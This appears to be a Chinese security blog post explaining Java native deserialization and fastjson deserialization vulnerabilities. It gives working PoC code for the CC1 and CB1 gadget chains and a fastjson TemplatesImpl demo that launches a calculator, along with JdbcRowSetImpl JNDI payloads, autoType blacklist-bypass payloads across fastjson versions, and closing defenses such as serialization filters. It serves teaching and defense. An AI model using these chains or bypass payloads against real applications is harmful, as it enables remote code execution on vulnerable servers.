---
date: '2025-11-08T00:03:05+08:00'
title: 'Java中的反序列化漏洞'
---


本文会简单描述一下Java中的原生反序列化、对应的部分常见利用链，然后介绍fastjson的反序列化漏洞，从而感受和对比二者在原理上的区别。文章的最后记录一些常见的防御/缓解措施。

<!--more-->

# 原生反序列化

```java
// 序列化对象
ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("obj.ser"));
out.writeObject(obj);

// 反序列化字节码为对象
ObjectInputStream in = new ObjectInputStream(new FileInputStream("obj.ser"));
Object o = in.readObject();
```

### readObject()中发生了什么？

1. 读取对象头，关注stream magic（0xAC ED）和stream version，用于校验合法性。
2. 读取类描述信息，包括类名、serialVersionUID，字段名称和类型，父类描述；反序列化时，JVM会加载该类（需要在CLASSPATH中），校验类的serialVersionUID 是否一致（否则抛出 InvalidClassException）。

3. 反序列化
    1. 对象实例化并 **不会调用构造方法**（<init>），而是通过 ObjectStreamClass 调用 **sun.misc.Unsafe.allocateInstance()** 或底层反射手段直接分配内存。
    2. **恢复字段值**：ObjectInputStream 读取流中的每个字段数据，并根据类型依次赋值
    3. 如果类自定义了`readObject()` JVM会自动调用它。原生反序列化漏洞的入口就在这里
    4. **触发readResolve()或validateObject等回调**

**要把一个原生反序列化的点变成RCE，攻击者需要构造一个 “gadget chain” —— 把目标上已有的classpath中存在的、反序列化过程中会调用的方法（gadget）按照一定顺序串起来，最终触发恶意的行为。**没有这样的链，单纯把一个 Serializable 对象放入流里通常**无法**直接拿到 RCE。

# 常见原生反序列化为入口的反序列化利用链

这里就先看一下CC1和CB1

## CC1

Common-Collections是apache的开源项目，提供了一组可复用的数据结构实现，包括各种集合、迭代器、队列、堆栈、映射、列表、集等。

在CC1中，通过动态代理类`AnnotationInvocationHandler`的readObject会调用invoke方法，然后调用`LazyMap#get()`去触发`ChainedTransformer`，在Transformer里代码对任意的方法进行反射调用。

### Transformer 接口

有时候需要将某个对象转换成另一个对象供另一组方法调用，而这两类对象的类型有可能并不是出于同一个继承体系的，或者说除了的Object之外没有共同的父类，或者我们根本不关心他们是不是有其他继承关系，甚至就是同一个类的实例。
Transformer作为一个接口类，提供一个对象转换方法transform（接收一个对象，然后对对象进行一些操作并输出）。

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image.png)

Transformer有几个重要的实现

- ConstantTransformer
- InvokerTransformer
- ChainedTransformer

**ConstantTransformer**

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%201.png)

直接将输入参数作为输出返回

**InvokerTransformer**

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%202.png)

可以通过反射调用任意方法

**ChainedTransformer**

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%203.png)

将多个Transformer串联，前一个的输出作为下一个的输入。

### TransformerMap

在这个类中，`checkSetValue`会调用transformer方法。如果`valueTransformer`能够控制为我们自己的`Invokertransformer`，就可以利用这个它反射调用我们的恶意代码。但这个方法是`protected`的，只能被其本身调用

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%204.png)

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%205.png)

`TransformedMap`类的`decorate`方法调用了`TransformedMap`类的构造函数。它是public属性，也就是说可以通过它控制`valueTransformer`值。

`decorator() --> valueTransformer`完成赋值，下面找**触发checkSetValue**的方法，查找用法，发现在MapEntry中，存在`setValue`，调用了`checkSetValue`方法。

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%206.png)

那么谁能够调用`MapEntry`的`setValue`方法呢？

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%207.png)

`AnnotationInvocationHandler` 的类中，调用了`setValue`

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%208.png)

但`AnnotationInvocationHandler`类没有被`public`声明（default类型），仅可在同一个包下可访问，外部只可以用反射获取这个类。

看这个类的构造方法，参数是一个`Class`对象，一个`Map`对象，其中`Class`继承了`Annotation`，也就是需要传入一个注解类进去（Target或者Override）。

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%209.png)

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2010.png)

```java
        Transformer[] transformerArray=new Transformer[]{
                new ConstantTransformer(Runtime.class),        //解决问题一：AnnotationInvocationHandler类的readObject()方法调用 的setValue()方法的参数不可控
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformerArray);

        Map<Object, Object> map = new HashMap<>();
        map.put("key", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        annotationConstructor.setAccessible(true);
        Object obj = annotationConstructor.newInstance(Target.class, transformedMap);
        
        serialize(obj);
        unserialize("ser1.bin"); 
```

## CB1

commons-beanutils 1.8.3

CommonsBeanutils 是应用于 javabean 的工具，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法

**关键点**

commons-beanutils中提供了一个静态方法**`PropertyUtils.getProperty()`**，可以让使用者直接调用任意JavaBean的getter方法

**`PropertyUtils.getProperty()`**传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性

```java
Person person = new Person("Mike");
PropertyUtils.getProperty(person,"name");
# 等价于
Person person = new Person("Mike");
person.getName();
```

除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象

中有属性c，我们可以通过 PropertyUtils.getProperty(a, "b.c"); 的方式进行递归获取。通过这个

方法，使用者可以很方便地调用任意对象的getter

关于getter，这里不得不提到**TemplatesImpl**，可以先看下面的[TemplatesImpl链](https://www.notion.so/TemplatesImpl-2a3c5c3c593e80279bc4d856292c0af4?pvs=21) 了解。

有了它，目前就有了这样的链路

```java
PropertyUtils#getProperty()
    TemplatesImpl#getOutputProperties()
        TemplatesImpl#newTransformer()
            TemplatesImpl#getTransletInstance()
                TemplatesImpl#defineTransletClasses()
                    TransletClassLoader#defineClass()

```

那么谁去调用`PropertyUtils`的`getProperty()` 呢？

### **BeanComparator.compare()**

`BeanComparator` 是一个Bean对象的比较类，当在一些需要排序的容器，如优先级队列里存放了多个Bean，那么就可以用BeanComparator去指定排序方法。

`BeanComparator`的`compare`方法接收两个对象，分别获取他们的属性值进行比较，调用了`getProperty`方法

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2011.png)

`PriorityQueue`实现了`Serializable`接口，重写了`readObject`方法。

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2012.png)

在`heapify()` 中，如果优先队列制定了Comparator，那么就在`siftDownUsingComparator`中调用对应的`compare()`

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2013.png)

因此，我们可以得到这样一条链路

```java
PriorityQueue.readObject()
    BeanComparator.compare()
            PropertyUtils.getProperty()
                PropertyUtilsBean.getProperty()
                    TemplatesImpl.getOutputProperties()
```

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CB_withCC {
    public static void setFieldValue(Object obj, String fieldname, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, NotFoundException, IOException, CannotCompileException, ClassNotFoundException {
        //动态创建字节码
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");";
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EVil");
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "RoboTerh");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});

        //创建比较器
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue queue = new PriorityQueue(2, beanComparator);
        queue.add(1);
        queue.add(1);

        //反射赋值
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(queue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }
}
```

# fastjson反序列化

## 基本原理

fastjson 的反序列化漏洞**不是**用 Java 原生序列化流（ObjectInputStream/readObject()）的那一套回调链；它是 JSON → Java 对象的转换里**滥用了“多态类型/自动类型（autoType）”与解析时会触发的构造/Setter/类型转换逻辑**

fastjson可以把json字符串解析json为JavaBean，通过`JSON.parse(jsonString)` 和 `JSON.parseObject(jsonString, Target.class)` 两者调用链一致，前者会在 jsonString 中解析字符串获取 `@type` 指定的类，后者则会直接使用参数中的class（如果没有则寻找`@type`）。

fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中对于getter方法：

1. **方法名长于 4**
2. **非静态方法**
3. 以 get 开头且第4位是大写字母
4. **方法不能有参数传入**
5. 继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong
6. 此属性没有 setter 方法

对于setter：

1. 方法名长于 4
2. 以 set 开头且第4位是大写字母
3. 非静态方法
4. 返回类型为 void 或当前类
5. 参数个数为 1 个

这一块的具体逻辑在`com.alibaba.fastjson.util.JavaBeanInfo.build()`  中

使用`JSON.parseObject(jsonString)`将会返回 JSONObject 对象，**且类中的所有 getter 与setter 都被调用**。

如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。

fastjson 在反序列化时，如果 Field 类型为 byte[]，将会调用`com.alibaba.fastjson.parser.JSONScanner#bytesValue` 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。

> 也就是说，为了利用fastjson的这一个特性，需要找到一些类，符合上述getter/setter的要求，且可以与字节码、类定义、加载相关联。
> 

对于fastjson反序列化的漏洞利用，有两种方式，一种是走**TemplatesImpl**利用链，这条依靠的是类的加载；一种是走**JdbcRowSetImpl**的`javax.naming.InitialContext#lookup()` 参数可控导致的 **JNDI 注入**

## TemplatesImpl链

### 原理

`TemplatesImpl` 是在 Java 中常见的一个类，它是 Java 的内部类之一，存在于`com.sun.org.apache.xalan.internal.xsltc.trax`包中，通常被用于处理 XSLT（Extensible Stylesheet Language Transformations）。`TemplatesImpl` 是 XSLT 处理器的一部分，通常用于将 XSLT 样式表编译为可以执行的对象。在运行时，它会将这些样式表转换为字节码（Java 字节码），然后通过类加载器加载和执行这些字节码。

- 将XSLT转化为Java字节码
- 通过类加载器加载和执行这些字节码

一个TemplatesImpl的成员变量如下

- `_name`：存储主类的名称，用于识别主要的 translet 类。
- `_bytecodes`：包含实际的 translet 类字节码，是执行转换的核心。
- `_class`：存储 translet 类的定义，包括主类和辅助类。
- `_outputProperties`：定义了输出属性，影响转换结果的格式。
- `getOutputProperties()` 方法就是类成员变量 _outputProperties 的 getter 方法，**可以被fastjson反序列化时触发。**

一个json字符串如果表示TemplatesImpl对象，如

```json
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["yv66vgAAADQA...CJAAk="],
    "_name": "fastjson_test",
    "_tfactory": {},
    "_outputProperties": {},
}
```

那么，在fastjson对其进行反序列化时，会去调用TemplatesImpl 的 `getOutputProperties()` 方法。接着

`getOutputProperties()`会调用`newTransformer().getOutputProperties()`
在`newTransformer()`时，会调用`getTransletInstance()`
在这个方法里，程序检查__class是否为空，如果为空则调用自定义的类定义方法`defineTransletClasses()`
接着会根据`__bytecode`的内容调用defineClass，把字节码转换为一个`Class`对象，然后再在`getTransletInstance()`中创建这个类实例。

**关键节点**

- **fastjson 的 autoType 必须允许 TemplatesImpl 被解析并实例化**（即 @type 被接受）。
- **fastjson 必须能写入私有字段 _bytecodes 等**（通常依赖 SupportNonPublicField 或等价特性），否则报错`set property error, outputProperties`。
- **应用或 fastjson 自身的解析/后续操作必须调用 getOutputProperties() / newTransformer() / 或其他最终能触发 getTransletInstance() 的方法**（这是把字节数组变为 Class 并初始化执行的时机）。
    
    如果任一环节被阻断（例如关闭 autoType、拒绝写入非 public 字段、拒绝调用这些方法），链条就会中断。
    

### demo

写一个小demo体会一下，JDK版本 1.8_462

Evil.java，手动编成class文件

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "open -a Calculator"});
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

FastjsonSeria.java

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.util.Base64;

public class FastjsonSeria {
    
    public static String readClassFileToBase64(String filePath) throws Exception {
        try (FileInputStream fis = new FileInputStream(filePath);
             ByteArrayOutputStream baos = new ByteArrayOutputStream()) {

            byte[] buffer = new byte[1024];
            int len;
            while ((len = fis.read(buffer)) != -1) {
                baos.write(buffer, 0, len);
            }

            return Base64.getEncoder().encodeToString(baos.toByteArray());
        }
    }

    public static void main(String[] args) throws Exception {
        System.out.println("hello fastjson");
        String evilCode = readClassFileToBase64("Evil.class");
        String jsonStr = String.format(
                "{" +
                        "\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                        "\"_bytecodes\":[\"%s\"]," +
                        "\"_name\":\"a.b\"," +
                        "\"_tfactory\":{}," +
                        "\"_outputProperties\":{}," +
                        "}",
                evilCode
        );
        System.out.println("生成的 JSON Payload:");
        System.out.println(jsonStr);
        ParserConfig config = new ParserConfig();
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        JSON.parseObject(jsonStr, Object.class, config, Feature.SupportNonPublicField);
    }
}

```

高版本JDK下编译，会由于 **JDK 模块系统（Java 9+）对“内部/非导出（internal）”包的限制**报错

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2014.png)

添加编译参数即可

```bash
javac \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED \
  --add-exports java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED \
  Evil.java
```

## **JdbcRowSetImpl链**

**JdbcRowSetImpl** 这里是利用`javax.naming.InitialContext#lookup()` 参数可控导致的 **JNDI 注入**

payload也比较简单。

```json
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://127.0.0.1:23457/Command8",
    "autoCommit":true
}
```

反射调用`setDataSourceName，`设置JNDI目标地址，然后反射调用`setAutoCommit`方法，在 `conn()` 中调用`lookup`方法，查找我们注入的`URL`所绑定的恶意的`JNDI`远程引用对象，执行远程恶意类对象工厂方法实现RCE。

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2015.png)

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2016.png)

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2017.png)

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2018.png)

## 更多payload

更多payload姿势见

[Fastjson 反序列化漏洞 · 攻击Java Web应用-[Java Web安全]](https://www.javasec.org/java-vuls/FastJson.html#%E5%9B%9B%E3%80%81payload)

## fastjson版本演进

**1.2.24**：没有任何防御措施

**1.2.25**：

引入了 `checkAutoType` 安全机制，默认情况下 `autoTypeSupport` 关闭，不能直接反序列化任意类，而打开 `AutoType` 之后，是基于内置黑名单来实现安全的，`fastjson` 也提供了添加黑名单的接口。

但是黑名单是可以绕过的，只需要在上版本的payload的类名前后加上`L`和`;`即可。因为这个版本的代码中为了兼容带描述符的类名，使用了特殊处理

![image.png](Java%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%202a3c5c3c593e80beb5aaf6b12e50989c/image%2019.png)

**1.2.42**：

延续类黑白名单的检测模式，但是将黑名单类从白名单修改为使用 HASH 的方式进行对比，这是为了防止安全研究人员根据黑名单中的类进行反向研究，用来对未更新的历史版本进行攻击。同时，作者对之前版本一直存在的使用类描述符绕过黑名单校验的问题尝试进行了修复。

但由于处理描述符是递归的，还是可以通过双写绕过

```json
{
    "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
    "dataSourceName":"ldap://127.0.0.1:23457/Command8",
    "autoCommit":true
}
```

**1.2.43**

修复了双写绕过的问题。但可以用`[` 

```json
{
    "@type":"[com.sun.rowset.JdbcRowSetImpl"[,
    {"dataSourceName":"ldap://127.0.0.1:23457/Command8",
    "autoCommit":true
}
```

**1.2.44**

添加新的判断，处理`[` ，基于黑名单字符串处理的绕过暂时告一段落

**1.2.45**

出现新的可利用类，黑名单需要不断扩充

```json
{
    "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    "properties":{
        "data_source":"ldap://127.0.0.1:23457/Command8"
    }
}
```

**1.2.47**

这个版本可以在不开启`AutoTypeSupport`的情况下进行反序列化的利用

**1.2.68**

更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 `checkAutoType()` 中直接抛出异常，也就是完全禁止 autoType

# 防御/缓解手段

**（不要反序列化来自不可信来源的二进制流） +（在无法避免时使用 JDK 的反序列化过滤器 / 白名单 / 流级过滤） +（最小化 classpath、升级依赖、在边界拦截/校验输入）**

## 高版本JDK的限制

JDK9 引入（JEP 290），并在后续版本（包括 Java 11/17/21）逐步完善；pattern-based filter 可通过 JVM 参数下发，并且在较早的安全更新中回溯到 8u121 等版本。

1. JVM/进程级的配置
    
    在 JVM 启动时加上 -Djdk.serialFilter=...，可以给 JVM 设置一个**全局的**模式过滤器（pattern-based）。示例：
    
    ```bash
    # 限制深度与只允许 com.example.safe 包，最后用 !* 拒绝其它类
    java -Djdk.serialFilter="maxdepth=20;com.example.safe.*;!*" -jar myapp.jar
    ```
    
    attern 语法可限制 maxdepth、maxarray、maxrefs，并包含类/包的 accept/reject 顺序（先匹配的优先）。使用 JVM 参数的好处是**不需要改代码**即可对所有 ObjectInputStream 生效（或至少作为默认过滤器被使用）
    
2. 在代码里设置过滤器
    
    ```java
    // Pattern-based filter（在应用启动时）
    ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
        "maxdepth=20;com.example.safe.*;!*"
    );
    ObjectInputFilter.Config.setSerialFilter(filter);
    
    // 或者为单个流设置更严格的 filter
    try (ObjectInputStream ois = new ObjectInputStream(inStream)) {
        ObjectInputFilter streamFilter = ObjectInputFilter.Config.createFilter("com.example.safe.*;!*");
        ois.setObjectInputFilter(streamFilter);
        Object obj = ois.readObject();
    }
    
    ```
    
3. 运行时保护
    
    **模块系统（JPMS，JDK 9+）**：把 com.sun.* / sun.* / com.sun.org.apache.* 等内部实现放在模块里、默认不导出，外部代码不能直接访问这些内部类，从而降低利用某些内置 gadget 的机会。
    

# ref

[https://www.javasec.org/java-vuls/](https://www.javasec.org/java-vuls/FastJson.html#1-fastjson-1224)

[https://blog.csdn.net/Jayjay___/article/details/133621214](https://blog.csdn.net/Jayjay___/article/details/133621214)

[https://www.freebuf.com/vuls/329299.html](https://www.freebuf.com/vuls/329299.html)